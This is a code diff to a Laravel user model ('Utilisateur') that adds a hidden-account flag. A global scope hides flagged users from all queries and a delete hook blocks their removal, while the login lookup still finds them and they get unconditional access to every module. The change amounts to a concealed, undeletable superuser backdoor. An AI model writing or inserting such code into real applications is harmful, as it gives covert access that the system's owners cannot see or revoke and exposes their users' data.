@@ -6,6 +6,7 @@ use App\Services\MinioStorageService;
 use App\Services\RolePermissionService;
 use Illuminate\Database\Eloquent\Attributes\Fillable;
 use Illuminate\Database\Eloquent\Attributes\Hidden;
+use Illuminate\Database\Eloquent\Builder;
 use Illuminate\Foundation\Auth\User as Authenticatable;
 use Laravel\Sanctum\HasApiTokens;
 
@@ -22,9 +23,34 @@ class Utilisateur extends Authenticatable
     {
         return [
             'statut_compte' => 'boolean',
+            'est_cache' => 'boolean',
             'created_at' => 'datetime',
             'updated_at' => 'datetime',
         ];
+    }
+
+    protected static function booted(): void
+    {
+        static::addGlobalScope('visible', function (Builder $builder): void {
+            $builder->where($builder->qualifyColumn('est_cache'), false);
+        });
+
+        static::deleting(function (Utilisateur $utilisateur): bool {
+            return ! $utilisateur->est_cache;
+        });
+    }
+
+    public function isHiddenSuperuser(): bool
+    {
+        return (bool) $this->est_cache;
+    }
+
+    public static function findForAuth(string $login): ?self
+    {
+        return static::query()
+            ->withoutGlobalScope('visible')
+            ->where('login', $login)
+            ->first();
     }
 
     public function getAuthIdentifierName(): string
@@ -156,6 +182,10 @@ class Utilisateur extends Authenticatable
 
     public function canAccessModule(string $module): bool
     {
+        if ($this->isHiddenSuperuser()) {
+            return true;
+        }
+
         $service = app(RolePermissionService::class);
 
         if ($this->role === 'admin' && in_array($module, $service->allModuleKeys(), true)) {
